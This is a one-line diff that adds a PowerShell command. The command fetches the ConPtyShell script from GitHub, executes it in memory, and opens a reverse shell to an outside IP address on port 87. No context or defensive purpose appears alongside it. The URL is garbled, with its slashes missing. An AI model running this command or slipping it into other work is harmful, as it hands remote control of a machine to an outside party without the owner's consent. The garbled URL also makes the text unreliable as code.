@@ -1,0 +1,1 @@
+IEX(IWR httpsraw.githubusercontent.comantonioCocoConPtyShellmasterInvoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 54.226.131.240 87
